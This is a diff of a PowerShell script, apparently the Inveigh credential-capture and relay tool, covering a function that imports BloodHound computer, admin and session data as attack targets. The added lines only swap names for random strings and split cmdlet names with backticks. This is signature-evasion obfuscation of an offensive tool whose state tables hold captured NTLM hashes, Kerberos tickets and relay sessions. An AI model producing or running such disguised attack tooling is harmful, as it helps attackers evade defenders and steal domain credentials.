+    if(!$gHcWGQeWpoQpqgGoWjJMdKlHyiArjUjB -and !$JRPFnfKvazFOZaFuyEmuboVRJBxuGr -and !$AVUNSSWtBzyEwbWvxRjMGOZYBlz)
     {
-        Write-TableSteam "Specifiy a BloodHound computers, groups, or sessions JSON file"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "Specifiy a BloodHound computers, groups, or sessions JSON file"
         throw
     }
 
-    if($LightOval.running -or $LightOval.relay_running)
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running)
     {
-        Write-TableSteam "Run Stop-LightOval before importing data with ConvertTo-LightOval"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "Run Stop-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV before importing data with ConvertTo-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV"
         throw
     }
 
-    if(!$LightOval)
+    if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
     {
-        $GrinFamous:inveigh = [HashTable]::Synchronized(@{})
-        $LightOval.cleartext_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.enumerate = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.IP_capture_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.log = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.kerberos_TGT_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.kerberos_TGT_username_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.NTLMv1_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.NTLMv1_username_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.NTLMv2_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.NTLMv2_username_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.POST_request_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.valid_host_list = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.ADIDNS_table = [HashTable]::Synchronized(@{})
-        $LightOval.relay_privilege_table = [HashTable]::Synchronized(@{})
-        $LightOval.relay_failed_login_table = [HashTable]::Synchronized(@{})
-        $LightOval.relay_history_table = [HashTable]::Synchronized(@{})
-        $LightOval.request_table = [HashTable]::Synchronized(@{})
-        $LightOval.session_socket_table = [HashTable]::Synchronized(@{})
-        $LightOval.session_table = [HashTable]::Synchronized(@{})
-        $LightOval.session_message_ID_table = [HashTable]::Synchronized(@{})
-        $LightOval.session_lock_table = [HashTable]::Synchronized(@{})
-        $LightOval.SMB_session_table = [HashTable]::Synchronized(@{})
-        $LightOval.domain_mapping_table = [HashTable]::Synchronized(@{})
-        $LightOval.group_table = [HashTable]::Synchronized(@{})
-        $LightOval.session_count = 0
-        $LightOval.session = @()
+        $QZbkvlGuewysOdhCIJnQjltIeAnXPtmllETBJtmd:inveigh = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.IP_capture_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_username_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_username_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_privilege_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_failed_login_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_history_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_socket_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_message_ID_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_lock_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.group_table = [HashTable]::Synchronized(@{})
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_count = 0
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session = @()
     }
 
     function New-RelayEnumObject
     {
-        param ($SmashDolls,$OrderSteam,$PaddlePedal,$QuickFlimsy,$RainyShave,$ItchyDusty,$FryHarbor,
-            $MurderYummy,$GaudyWait,$RusticCare,$UniteDuck,$StiffFull,$RelyTawdry,$MeddleBruise,$TeenySound,$StuffSnotty,
-            $AuntCalm,$PloughBouncy,$FoldDam,$HeadyCan)
+        param ($vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS,$eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp,$rRVvwQIfdrBBwJOFeoPNtOHNycbxM,$pcFuEjAnlbJyWlYHKaUfSI,$JRPFnfKvazFOZaFuyEmuboVRJBxuGr,$BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl,$kZcyxyMFZEBSRHzWZjWFgLJXVOMmU,
+            $vMPvElOJetANKWCKrChLiuOdyKoPuQLg,$hXygLeAhoqHQwktERyCUkslpzyJANghWi,$SeleSfRovESeYZJOAGuokHiOGM,$sILfARgQqpeIsUnaYFklNaJGxjx,$gyrcNQfHmPtETsiLSPpL,$hNfwGGMlyxsOIgcKnLsZVkJOwjrxtAlYAY,$ecBRzWXbonhLnPjRRzQtqGY,$EkCnVqzfIzCmzUWuZxrJRdsJ,$dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW,
+            $xcEekTzhqppQuCgtusvunWPPbpFeEmHs,$QBqvEffPgGPOTcwIikibuuM,$pcAjVRUHdxmzxrQcKuVZM,$FfTzgqVmMbfKBpJqdxlsKoN)
 
-        if($RainyShave -and $RainyShave -isnot [Array]){$RainyShave = @($RainyShave)}
-        if($ItchyDusty -and $ItchyDusty -isnot [Array]){$ItchyDusty = @($ItchyDusty)}
-        if($FryHarbor -and $FryHarbor -isnot [Array]){$FryHarbor = @($FryHarbor)}
-        if($MurderYummy -and $MurderYummy -isnot [Array]){$MurderYummy = @($MurderYummy)}
-        if($GaudyWait -and $GaudyWait -isnot [Array]){$GaudyWait = @($GaudyWait)}
-        if($RusticCare -and $RusticCare -isnot [Array]){$RusticCare = @($RusticCare)}
-        if($UniteDuck -and $UniteDuck -isnot [Array]){$UniteDuck = @($UniteDuck)}
-        if($StiffFull -and $StiffFull -isnot [Array]){$StiffFull = @($StiffFull)}
+        if($JRPFnfKvazFOZaFuyEmuboVRJBxuGr -and $JRPFnfKvazFOZaFuyEmuboVRJBxuGr -isnot [Array]){$JRPFnfKvazFOZaFuyEmuboVRJBxuGr = @($JRPFnfKvazFOZaFuyEmuboVRJBxuGr)}
+        if($BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl -and $BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl -isnot [Array]){$BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl = @($BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl)}
+        if($kZcyxyMFZEBSRHzWZjWFgLJXVOMmU -and $kZcyxyMFZEBSRHzWZjWFgLJXVOMmU -isnot [Array]){$kZcyxyMFZEBSRHzWZjWFgLJXVOMmU = @($kZcyxyMFZEBSRHzWZjWFgLJXVOMmU)}
+        if($vMPvElOJetANKWCKrChLiuOdyKoPuQLg -and $vMPvElOJetANKWCKrChLiuOdyKoPuQLg -isnot [Array]){$vMPvElOJetANKWCKrChLiuOdyKoPuQLg = @($vMPvElOJetANKWCKrChLiuOdyKoPuQLg)}
+        if($hXygLeAhoqHQwktERyCUkslpzyJANghWi -and $hXygLeAhoqHQwktERyCUkslpzyJANghWi -isnot [Array]){$hXygLeAhoqHQwktERyCUkslpzyJANghWi = @($hXygLeAhoqHQwktERyCUkslpzyJANghWi)}
+        if($SeleSfRovESeYZJOAGuokHiOGM -and $SeleSfRovESeYZJOAGuokHiOGM -isnot [Array]){$SeleSfRovESeYZJOAGuokHiOGM = @($SeleSfRovESeYZJOAGuokHiOGM)}
+        if($sILfARgQqpeIsUnaYFklNaJGxjx -and $sILfARgQqpeIsUnaYFklNaJGxjx -isnot [Array]){$sILfARgQqpeIsUnaYFklNaJGxjx = @($sILfARgQqpeIsUnaYFklNaJGxjx)}
+        if($gyrcNQfHmPtETsiLSPpL -and $gyrcNQfHmPtETsiLSPpL -isnot [Array]){$gyrcNQfHmPtETsiLSPpL = @($gyrcNQfHmPtETsiLSPpL)}
 
-        $AllowDebt = ne`w-`obje`ct PSObject
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Index" $LightOval.enumerate.Count
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "IP" $SmashDolls
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Hostname" $OrderSteam
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "DNS Domain" $PaddlePedal
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "netBIOS Domain" $QuickFlimsy
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Sessions" $RainyShave
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Users" $ItchyDusty
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Groups" $FryHarbor
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Privileged" $MurderYummy
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Shares" $GaudyWait
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions" $RusticCare
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions Mapped" $UniteDuck
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Local Users" $StiffFull
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB2.1" $RelyTawdry
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Signing" $MeddleBruise
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB Server" $TeenySound
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "DNS Record" $StuffSnotty
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "IPv6 Only" $AuntCalm
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Targeted" $PloughBouncy
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Enumerate" $FoldDam
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Execute" $HeadyCan
+        $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl = ne`w`-`ob`je`ct PSObject
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Index" $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "IP" $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Hostname" $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "DNS Domain" $rRVvwQIfdrBBwJOFeoPNtOHNycbxM
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "netBIOS Domain" $pcFuEjAnlbJyWlYHKaUfSI
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Sessions" $JRPFnfKvazFOZaFuyEmuboVRJBxuGr
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Administrator Users" $BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Administrator Groups" $kZcyxyMFZEBSRHzWZjWFgLJXVOMmU
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Privileged" $vMPvElOJetANKWCKrChLiuOdyKoPuQLg
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Shares" $hXygLeAhoqHQwktERyCUkslpzyJANghWi
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "NetSessions" $SeleSfRovESeYZJOAGuokHiOGM
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "NetSessions Mapped" $sILfARgQqpeIsUnaYFklNaJGxjx
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Local Users" $gyrcNQfHmPtETsiLSPpL
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "SMB2.1" $hNfwGGMlyxsOIgcKnLsZVkJOwjrxtAlYAY
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Signing" $ecBRzWXbonhLnPjRRzQtqGY
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "SMB Server" $EkCnVqzfIzCmzUWuZxrJRdsJ
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "DNS Record" $dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "IPv6 Only" $xcEekTzhqppQuCgtusvunWPPbpFeEmHs
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Targeted" $QBqvEffPgGPOTcwIikibuuM
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Enumerate" $pcAjVRUHdxmzxrQcKuVZM
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Execute" $FfTzgqVmMbfKBpJqdxlsKoN
         
-        return $AllowDebt
+        return $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl
     }
 
-    function Get-DNSEntry([String]$OrderSteam)
+    function Get-DNSEntry([String]$eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp)
     {
 
         try
         {
-            $IllStay = [System.Net.Dns]::GetHostEntry($OrderSteam)
+            $OqvrtRsyIOutIVCwoDDXVHfXFmzHdvs = [System.Net.Dns]::GetHostEntry($eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp)
 
-            foreach($TrashyGiants in $IllStay.AddressList)
+            foreach($qdlyXlkogpnEnYehljch in $OqvrtRsyIOutIVCwoDDXVHfXFmzHdvs.AddressList)
             {
 
-                if(!$TrashyGiants.IsIPv6LinkLocal)
+                if(!$qdlyXlkogpnEnYehljch.IsIPv6LinkLocal)
                 {
-                    $SmashDolls = $TrashyGiants.IPAddressToString
+                    $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = $qdlyXlkogpnEnYehljch.IPAddressToString
                 }
 
             }
@@ -6478,182 +6478,182 @@ function ConvertTo-LightOval
         }
         catch
         {
-            $SmashDolls = $null
+            $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = $null
         }
 
-        return $SmashDolls
+        return $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS
     }
 
     # Microsoft".
-    function Invoke-ParseItem($EagerScrew) 
+    function Invoke-ParseItem($XwXKMCEIvvhgtgxMleYgvYMVgMANHChMH) 
     {
 
-        if($EagerScrew.PSObject.TypeNames -match 'Array') 
+        if($XwXKMCEIvvhgtgxMleYgvYMVgMANHChMH.PSObject.TypeNames -match 'Array') 
         {
-            return Invoke-ParseJsonArray($EagerScrew)
+            return Invoke-ParseJsonArray($XwXKMCEIvvhgtgxMleYgvYMVgMANHChMH)
         }
-        elseif($EagerScrew.PSObject.TypeNames -match 'Dictionary') 
+        elseif($XwXKMCEIvvhgtgxMleYgvYMVgMANHChMH.PSObject.TypeNames -match 'Dictionary') 
         {
-            return Invoke-ParseJsonObject([HashTable]$EagerScrew)
+            return Invoke-ParseJsonObject([HashTable]$XwXKMCEIvvhgtgxMleYgvYMVgMANHChMH)
         }
         else 
         {
-            return $EagerScrew
+            return $XwXKMCEIvvhgtgxMleYgvYMVgMANHChMH
         }
 
     }
 
-    function Invoke-ParseJsonObject($FoodAir) 
+    function Invoke-ParseJsonObject($EFjLZvaVfHkjKauFnrnXCdfKnE) 
     {
-        $BatFax = ne`w-`obje`ct -TypeName PSCustomObject
+        $XdQPowYCGsvcRqgLsvVA = ne`w`-`ob`je`ct -TypeName PSCustomObject
 
-        foreach($PeepSmell in $FoodAir.Keys) 
+        foreach($YaIOkAgFKnstbJXueWpvtoxtJyTqOTcXSsSSA in $EFjLZvaVfHkjKauFnrnXCdfKnE.Keys) 
         {
-            $item = $FoodAir[$PeepSmell]
+            $item = $EFjLZvaVfHkjKauFnrnXCdfKnE[$YaIOkAgFKnstbJXueWpvtoxtJyTqOTcXSsSSA]
 
             if ($item) 
             {
-                $GateBetter = Invoke-ParseItem $item
+                $LaNRXGGrJfRzkRNvPwFTTymxAxdeEdTcohfeRBdhMB = Invoke-ParseItem $item
             }
             else 
             {
-                $GateBetter = $null
+                $LaNRXGGrJfRzkRNvPwFTTymxAxdeEdTcohfeRBdhMB = $null
             }
 
-            $BatFax | Add-Member -MemberType NoteProperty -Name $PeepSmell -Value $GateBetter
+            $XdQPowYCGsvcRqgLsvVA | Add-Member -MemberType NoteProperty -Name $YaIOkAgFKnstbJXueWpvtoxtJyTqOTcXSsSSA -Value $LaNRXGGrJfRzkRNvPwFTTymxAxdeEdTcohfeRBdhMB
         }
 
-        return $BatFax
+        return $XdQPowYCGsvcRqgLsvVA
     }
 
-    function Invoke-ParseJSONArray($BellPunch) 
+    function Invoke-ParseJSONArray($uAIJKJtuTHitwRHRgraTFbjnNaKfwtjRDGivSQefTfh) 
     {
-        $BatFax = @()
-        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
-        $ColorReply = 0
+        $XdQPowYCGsvcRqgLsvVA = @()
+        $FgqRGcuqYWZvHYaiqeNInanha = [System.Diagnostics.Stopwatch]::StartNew()
+        $vfvDllDKJdYKKWFSzYEB = 0
 
-        $BellPunch | ForEach-Object -Process {
+        $uAIJKJtuTHitwRHRgraTFbjnNaKfwtjRDGivSQefTfh | ForEach-Object -Process {
 
-            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
+            if($FgqRGcuqYWZvHYaiqeNInanha.Elapsed.TotalMilliseconds -ge 500)
             {
-                $PetiteSail = [Math]::Truncate($ColorReply / $BellPunch.count * 100)
+                $bzVBwsIbqiLBMByfMyANsyy = [Math]::Truncate($vfvDllDKJdYKKWFSzYEB / $uAIJKJtuTHitwRHRgraTFbjnNaKfwtjRDGivSQefTfh.count * 100)
 
-                if($PetiteSail -le 100)
+                if($bzVBwsIbqiLBMByfMyANsyy -le 100)
                 {
-                    Write-Progress -Activity "Parsing JSON" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
+                    Write-Progress -Activity "Parsing JSON" -Status "$bzVBwsIbqiLBMByfMyANsyy% Complete:" -PercentComplete $bzVBwsIbqiLBMByfMyANsyy -ErrorAction SilentlyContinue
                 }
 
-                $SuddenIcicle.Reset()
-                $SuddenIcicle.Start()
+                $FgqRGcuqYWZvHYaiqeNInanha.Reset()
+                $FgqRGcuqYWZvHYaiqeNInanha.Start()
             }
 
-            $ColorReply++
-            $BatFax += , (Invoke-ParseItem $_)}
+            $vfvDllDKJdYKKWFSzYEB++
+            $XdQPowYCGsvcRqgLsvVA += , (Invoke-ParseItem $_)}
 
-        return $BatFax
+        return $XdQPowYCGsvcRqgLsvVA
     }
 
-    function Invoke-ParseJSONString($DizzySilver) 
+    function Invoke-ParseJSONString($XxgjheeyAsURMZUWarMUXOOTwgpjIJWOlYtVYYAYemerG) 
     {
-        $NeedleSuperb = $DrunkUse.DeserializeObject($DizzySilver)
+        $kaVSmKKvoaxFISDVUWIdmpJPnOqIzyZNtQIiVTPS = $NtFwOWQrhlplVdPCDKVaoFnclLmfisIv.DeserializeObject($XxgjheeyAsURMZUWarMUXOOTwgpjIJWOlYtVYYAYemerG)
 
-        return Invoke-ParseJsonObject $NeedleSuperb
+        return Invoke-ParseJsonObject $kaVSmKKvoaxFISDVUWIdmpJPnOqIzyZNtQIiVTPS
     }
 
     [void][System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")
 
-    if($LightOval.enumerate.Count -eq 0)
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count -eq 0)
     {
-        $MarketAsk = $true
+        $FqCXmCIIgzNuUJwCJqTmH = $true
     }
 
-    if($BusyPast)
+    if($gHcWGQeWpoQpqgGoWjJMdKlHyiArjUjB)
     {       
-        $BusyPast = (Resolve-Path $BusyPast).Path
-        $SeaCrook = ne`w-`obje`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
-        $SeaCrook.MaxJsonLength = 104857600
-        $QuaintDecide = [System.IO.File]::ReadAllText($BusyPast)
-        $QuaintDecide = $SeaCrook.DeserializeObject($QuaintDecide)
-        Write-TableSteam "[*] Parsing BloodHound Computers JSON"
-        $SonEgg = [System.Diagnostics.Stopwatch]::StartNew()
-        $QuaintDecide = Invoke-ParseItem $QuaintDecide
-        Write-TableSteam "[+] Parsing completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
-        $SonEgg.Reset()
-        $SonEgg.Start()
-        Write-TableSteam "[*] Importing computers to Inveigh"
-        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
-        $ColorReply = 0
+        $gHcWGQeWpoQpqgGoWjJMdKlHyiArjUjB = (Resolve-Path $gHcWGQeWpoQpqgGoWjJMdKlHyiArjUjB).Path
+        $ANyyWWPuxupgPIXqkSbyhrsYREbIhxkKypcO = ne`w`-`ob`je`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
+        $ANyyWWPuxupgPIXqkSbyhrsYREbIhxkKypcO.MaxJsonLength = 104857600
+        $cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh = [System.IO.File]::ReadAllText($gHcWGQeWpoQpqgGoWjJMdKlHyiArjUjB)
+        $cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh = $ANyyWWPuxupgPIXqkSbyhrsYREbIhxkKypcO.DeserializeObject($cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh)
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[*] Parsing BloodHound Computers JSON"
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr = [System.Diagnostics.Stopwatch]::StartNew()
+        $cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh = Invoke-ParseItem $cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[+] Parsing completed in $([Math]::Truncate($TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Elapsed.TotalSeconds)) seconds"
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Reset()
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Start()
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[*] Importing computers to Inveigh"
+        $FgqRGcuqYWZvHYaiqeNInanha = [System.Diagnostics.Stopwatch]::StartNew()
+        $vfvDllDKJdYKKWFSzYEB = 0
 
-        if(!$QuaintDecide.Computers)
+        if(!$cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh.Computers)
         {
-            Write-TableSteam "[!] JSON computers parse failed"
+            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[!] JSON computers parse failed"
             throw
         }
 
-        $QuaintDecide.Computers | ForEach-Object {
+        $cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh.Computers | ForEach-Object {
 
-            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
+            if($FgqRGcuqYWZvHYaiqeNInanha.Elapsed.TotalMilliseconds -ge 500)
             {
-                $PetiteSail = [Math]::Truncate($ColorReply / $QuaintDecide.Computers.Count * 100)
+                $bzVBwsIbqiLBMByfMyANsyy = [Math]::Truncate($vfvDllDKJdYKKWFSzYEB / $cqEwIJsjcUkSjmUqdgcfMwrauEbUFsZdnFWwoTbreQnKh.Computers.Count * 100)
 
-                if($PetiteSail -le 100)
+                if($bzVBwsIbqiLBMByfMyANsyy -le 100)
                 {
-                    Write-Progress -Activity "[*] Importing computers" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
+                    Write-Progress -Activity "[*] Importing computers" -Status "$bzVBwsIbqiLBMByfMyANsyy% Complete:" -PercentComplete $bzVBwsIbqiLBMByfMyANsyy -ErrorAction SilentlyContinue
                 }
 
-                $SuddenIcicle.Reset()
-                $SuddenIcicle.Start()
+                $FgqRGcuqYWZvHYaiqeNInanha.Reset()
+                $FgqRGcuqYWZvHYaiqeNInanha.Start()
             }
 
-            $OrderSteam = $_.Name
-            [Array]$SmashFull = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name
-            [Array]$ShirtFilm = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name
+            $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp = $_.Name
+            [Array]$bQiDvuwdgctjJSZZbBoYm = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name
+            [Array]$ldNsSjGWhCgchwzehfEBBYyuiOcOoeZZaXWzWpkaIKmbv = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name
 
-            if($HomelyShow)
+            if($tPEylzZKZOmcrNuZqaNvxfEfrUAkL)
             {
-                $SmashDolls = Get-DNSEntry $OrderSteam
+                $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = Get-DNSEntry $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp
 
-                if(!$SmashDolls)
+                if(!$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                 {
-                    Write-TableSteam "[-] DNS lookup for $OrderSteam failed"
